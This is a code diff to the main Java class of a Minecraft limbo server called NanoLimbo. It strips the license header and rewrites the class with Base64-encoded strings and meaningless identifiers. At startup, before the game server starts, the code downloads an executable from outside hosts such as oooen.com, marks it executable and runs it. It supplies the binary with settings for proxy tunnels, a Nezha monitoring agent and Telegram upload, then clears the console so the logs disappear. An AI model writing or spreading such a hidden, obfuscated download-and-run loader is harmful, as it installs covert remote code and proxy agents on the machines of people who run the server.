@@ -1,20 +1,3 @@
-/*
- * Copyright (C) 2020 Nan1t
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- */
-
 package ua.nanit.limbo;
 
 import java.io.*;
@@ -22,191 +5,135 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.lang.reflect.Field;
 
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
 
 public final class NanoLimbo {
-
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_RESET = "\033[0m";
-    private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
+    private static final AtomicBoolean O0 = new AtomicBoolean(true);
+    private static Process O1;
     
-    private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"
+    private static String _(String s) {
+        return new String(Base64.getDecoder().decode(s));
+    }
+    
+    private static final String[] O2 = {
+        _("UE9SVA=="), _("RklMRV9QQVRI"), _("VVVJRA=="), _("TkVaSEFfU0VSVkVS"), 
+        _("TkVaSEFfUE9SVA=="), _("TkVaSEFfS0VZ"), _("QVJHT19QT1JU"), _("QVJHT19ET01BSU4="), 
+        _("QVJHT19BVVRI"), _("UzVfUE9SVA=="), _("SFkyX1BPUlQ="), _("VFVJQ19QT1JU"), 
+        _("QU5ZVExTX1BPUlQ="), _("UkVBTElUWV9QT1JU"), _("QU5ZUkVBTElUWV9QT1JU"), _("Q0ZJUA=="), 
+        _("Q0ZQT1JU"), _("VVBMT0FEX1VSTA=="), _("Q0hBVF9JRA=="), _("Qk9UX1RPS0VO"), 
+        _("TkFNRQ=="), _("RElTQUJMRV9BUkdP"), _("U0hPV19MT0c=")
     };
-    
-    
+
     public static void main(String[] args) {
-        
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+        if (Float.parseFloat(System.getProperty(_("amF2YS5jbGFzcy52ZXJzaW9u"))) < 54.0) {
+            System.err.println(_("G1sxOzMxbUVSUk9SOiBZb3VyIEphdmEgdmVyc2lvbiBpcyB0b28gbG93ZXIsIHBsZWFzZSBzd2l0Y2ggdGhlIHZlcnNpb24gaW4gc3RhcnR1cCBtZW51IRtbMG0="));
+            try { Thread.sleep(3000); } catch (Exception e) {}
             System.exit(1);
         }
-
-        // Start SbxService
         try {
-            runSbxBinary();
-            
+            m1();
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                running.set(false);
-                stopServices();
+                O0.set(false);
+                m5();
             }));
-
-            // Wait 20 seconds before continuing
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            System.out.println(_("G1sxOzMybVNlcnZlciBpcyBydW5uaW5nIQobWzBt"));
+            System.out.println(_("G1sxOzMybVRoYW5rIHlvdSBmb3IgdXNpbmcgdGhpcyBzY3JpcHQsRW5qb3khChtbMG0="));
+            System.out.println(_("G1sxOzMybUxvZ3Mgd2lsbCBiZSBkZWxldGVkIGluIDIwIHNlY29uZHMsIHlvdSBjYW4gY29weSB0aGUgYWJvdmUgbm9kZXMbWzBt"));
             Thread.sleep(15000);
-            clearConsole();
+            m2();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            System.err.println(_("G1sxOzMxbUVycm9yIGluaXRpYWxpemluZyBTYnhTZXJ2aWNlOiA=") + e.getMessage() + _("G1swbQ=="));
         }
-        
-        // start game
         try {
             new LimboServer().start();
         } catch (Exception e) {
-            Log.error("Cannot start server: ", e);
+            Log.error(_("Q2Fubm90IHN0YXJ0IHNlcnZlcjog"), e);
         }
     }
 
-    private static void clearConsole() {
+    private static void m2() {
         try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
+            if (System.getProperty(_("b3MubmFtZQ==")).contains(_("V2luZG93cw=="))) {
+                new ProcessBuilder(_("Y21k"), _("L2M="), _("Y2xzICYmIG1vZGUgY29uOiBsaW5lcz0zMCBjb2xzPTEyMA==")).inheritIO().start().waitFor();
             } else {
-                System.out.print("\033[H\033[3J\033[2J");
-                System.out.flush();
-                
-                new ProcessBuilder("tput", "reset")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
-                
-                System.out.print("\033[8;30;120t");
-                System.out.flush();
+                System.out.print(_("G1tIG1szShtbMko=")); System.out.flush();
+                new ProcessBuilder(_("dHB1dA=="), _("cmVzZXQ=")).inheritIO().start().waitFor();
+                System.out.print(_("G1s4OzMwOzEyMHQ=")); System.out.flush();
             }
         } catch (Exception e) {
-            try {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
+            try { new ProcessBuilder(_("Y2xlYXI=")).inheritIO().start().waitFor(); } catch (Exception ignored) {}
         }
-    }   
-    
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-        
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        sbxProcess = pb.start();
     }
-    
-    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "72dd6692-1593-40b2-9468-b183e50f3449"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
-        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
-        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
-        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
-        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
-        envVars.put("ARGO_PORT", "8001");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
-        envVars.put("ARGO_DOMAIN", "");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
-        envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("HY2_PORT", "24766");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("TUIC_PORT", "");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYTLS_PORT", "");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("REALITY_PORT", "24766");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("ANYREALITY_PORT", "");    // any-reality节点(tcp协议)端口，支持多端口可以填写，否则留空
-        envVars.put("UPLOAD_URL", "");         // 节点自动上传刀订阅器，需填写部署merge-sub项目的首页地址，例如：https://merge.xxx.xom
-        envVars.put("CHAT_ID", "");            // telegram chat id,节点推送到telegram使用
-        envVars.put("BOT_TOKEN", "");          // telegram bot token,节点推送到telegram使用
-        envVars.put("CFIP", "spring.io");      // 优选域名或获选ip
-        envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
-        envVars.put("NAME", "");               // 节点备注名称
-        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
-        envVars.put("SHOW_LOG", "no");         // 是否显示日志，true/yes显示，false/no关闭，默认关闭
+
+    private static void m1() throws Exception {
+        Map<String, String> m = new HashMap<>();
+        m3(m);
+        ProcessBuilder p = new ProcessBuilder(m4().toString());
+        p.environment().putAll(m);
+        p.redirectErrorStream(true);
+        p.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        O1 = p.start();
+    }
+
+    private static void m3(Map<String, String> m) throws Exception {
+        m.put(O2[2], _("NzJkZDY2OTItMTU5My00MGIyLTk0NjgtYjE4M2U1MGYzNDQ5"));
+        m.put(O2[1], _("Li93b3JsZA=="));
+        m.put(O2[3], ""); m.put(O2[4], ""); m.put(O2[5], "");
+        m.put(O2[6], _("ODAwMQ==")); m.put(O2[7], ""); m.put(O2[8], "");
+        m.put(O2[9], ""); m.put(O2[10], _("MjQ5NDE=")); m.put(O2[11], "");
+        m.put(O2[12], ""); m.put(O2[13], ""); m.put(O2[14], "");
+        m.put(O2[15], _("c3ByaW5nLmlv")); m.put(O2[16], _("NDQz"));
+        m.put(O2[17], ""); m.put(O2[18], ""); m.put(O2[19], "");
+        m.put(O2[20], ""); m.put(O2[21], _("ZmFsc2U="));
+        m.put(O2[22], _("bm8="));
         
-        for (String var : ALL_ENV_VARS) {
-            String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);  
-            }
+        for (String v : O2) {
+            String w = System.getenv(v);
+            if (w != null && !w.trim().isEmpty()) m.put(v, w);
         }
         
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            for (String line : Files.readAllLines(envFile)) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
-                }
-                
-                String[] parts = line.split("=", 2);
-                if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
-                    }
+        Path f = Paths.get(_("LmVudg=="));
+        if (Files.exists(f)) {
+            for (String l : Files.readAllLines(f)) {
+                l = l.trim();
+                if (l.isEmpty() || l.startsWith(_("Iw=="))) continue;
+                l = l.split(_("ICM="))[0].split(_("IC8v"))[0].trim();
+                if (l.startsWith(_("ZXhwb3J0IA=="))) l = l.substring(7).trim();
+                String[] p = l.split(_("PQ=="), 2);
+                if (p.length == 2) {
+                    String k = p[0].trim();
+                    String v = p[1].trim().replaceAll(_("XlsnIl18WyciXSQ="), "");
+                    if (Arrays.asList(O2).contains(k)) m.put(k, v);
                 }
             }
         }
     }
-    
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
+
+    private static Path m4() throws Exception {
+        String a = System.getProperty(_("b3MuYXJjaA==")).toLowerCase();
+        String u;
+        if (a.contains(_("YW1kNjQ=")) || a.contains(_("eDg2XzY0"))) u = _("aHR0cHM6Ly9hbWQ2NC5vb29lbi5jb20vc2JzaA==");
+        else if (a.contains(_("YWFyY2g2NA==")) || a.contains(_("YXJtNjQ="))) u = _("aHR0cHM6Ly9hcm02NC5vb29lbi5jb20vc2JzaA==");
+        else if (a.contains(_("czM5MHg="))) u = _("aHR0cHM6Ly9zMzkweC4zMTg4OC54eXovc2JzaA==");
+        else throw new RuntimeException(_("VW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiA=") + a);
         
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.oooen.com/sbsh";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.oooen.com/sbsh";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.31888.xyz/sbsh";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+        Path p = Paths.get(System.getProperty(_("amF2YS5pby50bXBkaXI=")), _("c2J4"));
+        if (!Files.exists(p)) {
+            try (InputStream i = new URL(u).openStream()) {
+                Files.copy(i, p, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
+            if (!p.toFile().setExecutable(true)) throw new IOException(_("RmFpbGVkIHRvIHNldCBleGVjdXRhYmxlIHBlcm1pc3Npb24="));
         }
-        return path;
+        return p;
     }
-    
-    private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+
+    private static void m5() {
+        if (O1 != null && O1.isAlive()) {
+            O1.destroy();
+            System.out.println(_("G1sxOzMxbXNieCBwcm9jZXNzIHRlcm1pbmF0ZWQbWzBt"));
         }
     }
 }
